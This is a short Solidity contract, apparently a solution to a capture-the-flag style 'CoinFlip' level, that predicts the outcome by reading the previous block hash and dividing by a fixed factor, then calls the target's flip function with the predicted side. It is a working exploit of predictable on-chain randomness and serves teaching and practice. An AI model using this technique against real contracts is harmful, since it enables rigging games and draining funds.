// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/CoinFlip.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract CoinFlipAttack {

    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address victim) public returns(bool) {
        CoinFlip coinflip = CoinFlip(victim);
        
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
        return side;
    }

    function getConsecutiveWins(address victim) public  view returns(uint) {
        CoinFlip coinflip = CoinFlip(victim);
        return coinflip.consecutiveWins();
    }
        
}
